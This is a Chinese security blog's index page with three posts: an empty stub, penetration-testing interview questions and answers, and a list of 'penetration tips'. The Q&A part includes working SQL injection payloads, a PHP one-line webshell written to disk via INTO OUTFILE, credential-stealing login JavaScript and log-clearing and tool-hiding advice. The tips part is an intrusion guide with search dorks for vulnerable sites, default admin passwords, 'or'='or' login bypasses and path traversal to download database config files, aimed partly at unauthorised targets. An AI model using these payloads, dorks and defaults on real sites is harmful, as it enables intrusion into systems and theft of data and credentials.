<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="alternate" href="/atom.xml" title="ClearLoveの博客" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-pace-theme-center-atom.min.css">
  <script src="/lib/pace/pace.min.js"></script>


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.5.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: '复制',
      copy_success: '复制成功',
      copy_failure: '复制失败'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="胡歌">
<meta property="og:type" content="website">
<meta property="og:title" content="ClearLoveの博客">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="ClearLoveの博客">
<meta property="og:description" content="胡歌">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ClearLoveの博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ClearLoveの博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">我们称之为路的，其实不过是彷徨</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">内网渗透</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-11-19 15:20:48 / 修改时间：15:21:06" itemprop="dateCreated datePublished" datetime="2019-11-19T15:20:48+08:00">2019-11-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code> 内网渗透 </code></pre>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">渗透测试面试问题</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-19 14:33:06" itemprop="dateCreated datePublished" datetime="2019-11-19T14:33:06+08:00">2019-11-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-11-20 13:39:55" itemprop="dateModified" datetime="2019-11-20T13:39:55+08:00">2019-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.拿到一个待检测的站，你觉得应该先做什么？</p>
<pre><code>1)信息收集
    1，获取域名的whois信息,获取注册者邮箱姓名电话等。
    2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。
    3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞
    4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。
    5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针
    6，google hack 进一步探测网站的信息，后台，敏感文件
2）漏洞扫描
    开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，
    远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等
3）漏洞利用
    利用以上的方式拿到webshell，或者其他权限
4）权限提升
    提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权
5) 日志清理
6）总结报告及修复方案</pre></code>

<p>2.判断出网站的CMS对渗透有什么意义？</p>
<pre><code>查找网上已曝光的程序漏洞。
如果开源，还能下载相对应的源码进行代码审计。</pre></code>

<p>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p>
<pre><code>敏感文件、二级目录扫描
站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</pre></code>

<p>4.常见的网站服务器容器。</p>
<pre><code>IIS、Apache、nginx、Lighttpd、Tomcat</pre></code>

<p>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</p>
<pre><code>root权限以及网站的绝对路径。</pre></code>

<p>6.目前已知哪些版本的容器有解析漏洞，具体举例。</p>
<pre><code>IIS 6.0
/xx.asp/xx.jpg "xx.asp"是文件夹名
IIS 7.0/7.5
默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析
Nginx
版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。
空字节代码 xxx.jpg.php
Apache
上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀
lighttpd
xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</pre></code>

<p>7.如何手工快速判断目标站是windows还是linux服务器？</p>
<pre><code>linux大小写敏感,windows大小写不敏感。</pre></code>

<p>8.为何一个mysql数据库的站，只有一个80端口开放？</p>
<pre><code>更改了端口，没有扫描出来。
站库分离。
3306端口不对外开放</pre></code>

<p>9、3389无法连接的几种情况</p>
<pre><code>没开放3389 端口
端口被修改
防护拦截
处于内网(需进行端口转发)</pre></code>

<p>10.如何突破注入时字符被转义？</p>
<pre><code>宽字符注入
hex编码绕过</pre></code>

<p>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</p>
<pre><code>查看编辑器的名称版本,然后搜索公开的漏洞。</pre></code>

<p>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</p>
<pre><code>能做的事情很多，用隐藏网马来举例子：
插入
![upload successful](/images/pasted-43.png)
文件会被解析成.php文件。
具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</pre></code>

<p>13.注入漏洞只能查账号密码？</p>
<pre><code>只要权限广，拖库脱到老。</pre></code>

<p>14.安全狗会追踪变量，从而发现出是一句话木马吗？</p>
<pre><code>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</pre></code>

<p>15.access 扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</p>
<pre><code>迅雷下载，直接改后缀为.mdb。</pre></code>

<p>16.提权时选择可读写目录，为何尽量不用带空格的目录？</p>
<pre><code>因为exp执行多半需要空格界定参数</pre></code>

<p>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p>
<pre><code>同数据库。</pre></code>

<p>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</p>
<pre><code>and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</pre></code>

<p>19:某个防注入系统，在注入时会提示：</p>
<pre><code>系统检测到你有非法注入的行为。
已记录您的ip xx.xx.xx.xx
时间:2016:01-23
提交页面:test.asp?id=15
提交内容:and 1=1</pre></code>

<p>20、如何利用这个防注入系统拿shell？</p>
<pre><code>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。</pre></code>

<p>21.上传大马后访问乱码时，有哪些解决办法？</p>
<pre><code>浏览器中改编码。</pre></code>

<p>22.审查上传点的元素有什么意义？</p>
<pre><code>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</pre></code>

<p>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p>
<pre><code>先爆破用户名，再利用被爆破出来的用户名爆破密码。
其实有些站点，在登陆处也会这样提示
所有和数据库有交互的地方都有可能有注入。</pre></code>

<p>24.目标站发现某txt的下载地址为<a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你</a><pre><code>有什么思路？<br>这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</pre></code></p>
<p>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</p>
<pre><code>直接在网站二级目录/abc/下扫描敏感文件及目录。</pre></code>

<p>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</p>
<pre><code>后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。
在登录后才可以访问的文件中插入XSS脚本。</pre></code>

<p>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</p>
<pre><code>审查元素 把密码处的password属性改成text就明文显示了</pre></code>

<p>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</p>
<pre><code>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</pre></code>

<p>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</p>
<pre><code>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</pre></code>

<p>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</p>
<pre><code>隐藏文件夹，为了不让管理员发现你传上去的工具。</pre></code>

<p>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</p>
<pre><code>A. demo.jsp?id=2+1 B. demo.jsp?id=2-1
选B，在 URL 编码中 + 代表空格，可能会造成混淆</pre></code>

<p>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</p>
<pre><code>demo.do?DATA=AjAxNg==
DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</pre></code>

<p>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</p>
<pre><code>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell
使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高
通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</pre></code>

<p>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</p>
<pre><code>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。
CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer
XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</pre></code>

<p>35、CSRF、SSRF和重放攻击有什么区别？</p>
<pre><code>CSRF是跨站请求伪造攻击，由客户端发起
SSRF是服务器端请求伪造，由服务器发起
重放攻击是将截获的数据包进行重放，达到身份认证等目的</pre></code>

<p>36、说出至少三种业务逻辑漏洞，以及修复方式？</p>
<pre><code>密码找回漏洞中存在

1）密码允许暴力破解、

2）存在通用型找回凭证、

3）可以跳过验证步骤、

4）找回凭证可以拦包获取

等方式来通过厂商提供的密码找回功能来得到密码。
身份认证漏洞中最常见的是

1）会话固定攻击

2） Cookie 仿冒

只要得到 Session 或 Cookie 即可伪造用户身份。
验证码漏洞中存在

1）验证码允许暴力破解

2）验证码可以通过 Javascript 或者改包的方法来进行绕过</pre></code>

<p>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</p>
<pre><code>get /ecskins/demo.jsp?uid=2016031900&keyword=”hello world”
HTTP/1.1Host:***.com:82User-Agent:Mozilla/
5.0 Firefox/40Accept:text/css,/;q=0.1
Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3
Referer:http://*******.com/eciop/orderForCC/
cgtListForCC.htm?zone=11370601&v=145902
Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;
uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;
st_uid=N90PLYHLZGJXI-NX01VPUF46W;
status=True
Connection:keep-alive</pre></code>

<p>38、给你一个网站你是如何来渗透测试的?</p>
<pre><code>在获取书面授权的前提下。</pre></code>

<p>39、sqlmap，怎么对一个注入点注入？</p>
<pre><code>1）如果是get型号，直接，sqlmap -u "诸如点网址".
2) 如果是post型诸如点，可以sqlmap -u "注入点网址” --data="post的参数"
3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r "文件地址"</pre></code>

<p>40、nmap，扫描的几种方式</p>
<p>41、sql注入的几种类型？</p>
<pre><code>1）报错注入
2）bool型注入
3）延时注入
4）宽字节注入</pre></code>
<p>42、报错注入的函数有哪些？ 10个</p>
<pre><code>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】----------------
2）通过floor报错 向下取整
3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));
5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));
6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));
7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));
8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));
9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));
10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</pre></code>

<p>43、延时注入如何来判断？</p>
<pre><code>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</pre></code>

<p>44、盲注和延时注入的共同点？</p>
<pre><code>都是一个字符一个字符的判断</pre></code>

<p>45、如何拿一个网站的webshell？</p>
<pre><code>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，
一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</pre></code>

<p>46、sql注入写文件都有哪些函数？</p>
<pre><code>select '一句话' into outfile '路径'
select '一句话' into dumpfile '路径'
select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\wwwroot\baidu.com\nvhack.php';</pre></code>

<p>47、如何防止CSRF?</p>
<pre><code>1,验证referer
2，验证token
详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd</pre></code>

<p>48、owasp 漏洞都有哪些？</p>
<pre><code>1、SQL注入防护方法：
2、失效的身份认证和会话管理
3、跨站脚本攻击XSS
4、直接引用不安全的对象
5、安全配置错误
6、敏感信息泄露
7、缺少功能级的访问控制
8、跨站请求伪造CSRF
9、使用含有已知漏洞的组件
10、未验证的重定向和转发</pre></code>

<p>49、SQL注入防护方法？</p>
<pre><code>1、使用安全的API
2、对输入的特殊字符进行Escape转义处理
3、使用白名单来规范化输入验证方法
4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</pre></code>

<p>50、代码执行，文件读取，命令执行的函数都有哪些？</p>
<pre><code>1）代码执行：

eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function

2）文件读取：

file_get_contents(),highlight_file(),fopen(),read

file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
3)命令执行：

system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</pre></code>

<p>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</p>
<pre><code>src指定一个远程的脚本文件，获取referer</pre></code>

<p>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</p>
<pre><code>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析
AddType application/x-httpd-php .jpg
![upload successful](/images/pasted-42.png)
会以php方式来解析</pre></code>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">渗透测试技巧</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-11-19 14:10:33 / 修改时间：15:43:53" itemprop="dateCreated datePublished" datetime="2019-11-19T14:10:33+08:00">2019-11-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>
1.无论什么站，无论什么语言，我要渗透，第一件事就是扫目录，最好一下扫出个上传点，直接上传 shell ，诸位不要笑，有时候你花很久搞一个站，最后发现有个现成的上传点，而且很容易猜到，不过这种情况发生在 asp 居多！
2.asp （ aspx ）+MSSQL 先考虑注入，一般的注入都有 DBowner 权限可以直接写 shell ；如果写不了，或者 web 与数据库分离，那就猜数据，从后台下手了，后台可以上传或者改配置文件；
3.asp （ aspx ）+ACCESS 拿 shell 一般只有 3 种方法，一是前台上传或者注入进后台上传；二是注入进后台改配置文件；三是注入进后台备份数据库或者暴库后知道是 asp 或者 asa 数据库于是直接写一句话；
4.php+MYSQL 一般是注入进后台上传，偶尔运气好些权限够高可以注入 select into outfile ；然后包含，分本地与远程，远程包含在高版本 php 是不支持的，于是想办法本地上传图片文件或者写到 log 里；然后 php 程序某某未公开的漏洞，运气好可以直接写 shell 。
5.jsp+MYSQL 利用数据库拿权限方面基本同 php ，而且 jsp 的上传基本很少检查文件后缀，于是只要有注入点与后台，拿 shell 相当的容易。 jsp+ORACLE 的站我碰到的不多，碰到的也是猜出用户名与密码从后台下手的。
6.无论什么大站，主站一般都很安全（不然早被人玩了），于是一般从二级域名下手，猜出主站的某些用户名与密码或者搞到主站的源代码，或者旁注得到同网段服务器后 cain 或 arp 。
7.一般的大站很少有用现成的 CMS 的，于是如果你有幸找到源码，那你就发了，注入漏洞啊，上传漏洞啊，写文件漏洞啊，都掌握在你手里。多看看那些大站新出来的测试分站点，那些站还在测试中，可以很轻松拿下。
8.上传有个文件名截断，这包括 2 个方面，一是 00 截断，二是长文件名截断（曾经利用这个搞下 hw ）；然后很多写文件的地方，都可以 00 ，屡试不爽。上传别忘了.asp （当然.asa ，.cer ，.cdx 都可以啦）目录的妙用。
9.php 站无论 windows 还是 linux ，都有 magic_quotes_gpc 的问题， magic_quotes_gpc 为 on 的时候，在 server 变量注入的时候还是可以 select into outfile ，今年我搞过某未开源 cms 就是这个情况，一般情况下为 on 就别考虑写文件了，不过有这个权限别忘了读文件源码，因为 load_file 的参数是可以编码的。
10.猜路径或者文件在入侵中非常必要，猜不到路径的时候别忘了 google （ baidu 太烂， google 很全），于是你可以考虑看站点下的 robot.txt 或者 robots.txt ，会有惊喜。
11.工具的使用很重要，入侵之前用 WVS 扫扫会有助入侵；注入工具虽然很多，但不见得都好使，现在的软硬防火墙、防注入越来越厉害，那时候你就别偷懒，多手工有助你成长。
12.遇到过一流监控么，遇到其他防 post 的防火墙么，有时候一句话进去了都无法传大马，那时候，你先学学编码，学学变换绕过。
13.想搞一般的小站，记得查看这个小站的版权，找做这个站的公司，然后从这个公司做的其他站下手，得到源码再回头搞，我曾经通过这个方法拿下某知名制药的公司站。
14.旁注的思路永远不过时，遇到 dbowner 的注入，可以很舒服写 shell 到你需要的站，省得麻烦的提权了；运气不好，按部就班拿 shell 提权得到你所需。
15.永远别忘记社会工程学，利用社工把自己当成一个什么也不会的人，从某某站长的 qq ，身份证，邮箱等等下手，也许有时可能会有意外；另外别忘记 admin,admin ； test,test ； 123456,123456 这种简单的尝试，当然，你也可以暴力破解。
16.别忽视 XSS ，别忽视 cookie ， XSS 可以偷 cookie ，更有若干妙用，自己学会领悟； cookie 可以伪造登陆， cookie 可以注入， cookie 注入可以绕绝大多数的防火墙。
17.平时搞站多多搜集路径啊，源码啊，工具啊，充实自己的“武器”库；最好把自己的入侵步骤记录下来，或者事后反思下，我一般都是记在 txt 里，另外要做到举一反三。
18 、到 GoogLe,搜索一些关键字,edit.asp? 韩国肉鸡为多,多数为 MSSQL 数据库!
19 、到 Google ,site:cq.cn inurl:asp
20 、利用挖掘鸡和一个 ASP 木马. 文件名是 login.asp 路径组是 /manage/ 关键词是 went.asp 用'or'='or'来登陆
21 、关键字： Co Net MIB Ver 1.0 网站后台管理系统帐号密码为 'or'='or'
22 、动感购物系统 inurl:help.asp 登陆，如未注册成为会员! upLoad_bm1.asp 和 upLoad_c1.asp 这两个随便选个，一般管理员都忽视了这 2 漏洞
23 、默认数据库地址 blogdata/acblog.asa 关键字： acblog
24 、百度 /htdocs 注册里可以直接上传 asa 文件！
25 、/Database/#newasp.mdb 关键词： NewAsp SiteManageSystem Version
26 、用挖掘机 关键字： Powered by WEBBOY 页面：/upfile.asp
27. baidu 中搜索关键字 Ver5.0 Build 0519 (存在上传漏洞)
28. Upfile_Article.asp bbs/upfile.asp 输入关键字： powered by mypower ，
29. inurl:winnt\system32\inetsrv\ 在 google 里面输入这个就可以找到很多网站
30. 现在 GOOGLE 搜索关键字 intitle:网站小助手　 inurl:asp
31. 键字： 首页 最新动态 新手指南 舞曲音乐 下载中心 经典文章 玩家风采 装备购买 站内流言 友情连接 本站论坛挖掘鸡的关键字 添 setup.asp
32. VBulletin 论坛的数据库默认数据库地址! /includes/functions.php 工具: 1.网站猎手 下载地址:百度 Google! 2.Google 关键字: Powered by: vBulletin Version 3.0.1 Powered by: vBulletin Version 3.0.2 Powered by: vBulletin Version 3.0.3 其中一个就可以了
33. 1.打开百度或 GOOGLE 搜索，输入 powered by comersus ASP shopping cart open source 。 这是一个商场系统。 2.网站的最底部分，有个 Comersus Open Technologies LC 。打开看下~~comersus 系统~ 猜到,comersus.mdb. 是数据库名数据库都是放在 database/ 后的, 所以 database/comersus.mdb comersus_listCategoriesTree.asp 换成 database/comersus.mdb ，不能下载。那样把前一个 ''store/''除去，再加上 database/comersus.mdb 试试
34. 无忧传奇官方站点程序。 1 、后台管理地址： http://您的域名 /msmiradmin/ 2 、默认后台管理帐号： msmir 3 、默认后台管理密码： msmirmsmir 数据库文件为 http://您的域名 /msmirdata/msmirArticle.mdb 数据库连接文件为 ***********/Conn.asp
35. 百度里输入 /skins/default/
36. 利用挖掘机关键机:power by Discuz 路径:/wish.php 配合: Discuz!论坛 wish.php 远程包含漏洞 工具使用
37. 上传漏洞. 工具 : Domain3.5 网站猎手 1.5 版关键字 powered by mypower 检测的页面或文件插入 upfile_photo.asp
38. 新云漏洞这个漏洞 ACCESS 和 SQL 版通吃。 Google 搜索关键字 "关于本站 - 网站帮助 - 广告合作 - 下载声明 - 友情连接 - 网站地图 - 管理登录" 把 flash/downfile.asp?url=uploadfile/../../conn.asp 提交到网站根目录。就可以下载 conn.asp 以源码，软件等下载站居多。大家时常碰到数据库如果前面或者中间+了# 可以用%23 替换就可以下载了 \database\%23newasp.mdb 如：#xzws.mdb 改成%23xzws.mdb
39. 通吃所有商城+动力上传系统使用工具:挖掘鸡 v1.1 明小子商城入侵: 关键字:选购->加入购物车->去收银台->确认收货人信息->选付款方式->选配送方式->在线支付或下单后汇款 ->汇款确认->发货->完成漏洞页面:upload.asp upfile_flash.asp 动力入侵: 关键字:powered by mypower 漏洞页面:upfile_photo.asp Upfile_Soft.asp upfile_adpic.asp upfile_softpic.asp
40 、动易列目录 admin_articlerecyclebin.asp inurl:admin_articlerecyclebin.asp
41 、工具:网站猎手关键词:inurl:Went.asp 后缀:manage/login.asp 口令:'or'='or'
42 、入侵魔兽私服需要的工具： ASP 木马一只。 Domain3.5 明小子关键字： All Right Reserved Design:游戏联盟后台地址： admin/login.asp 数据库的地址： chngame/#chngame.mdb
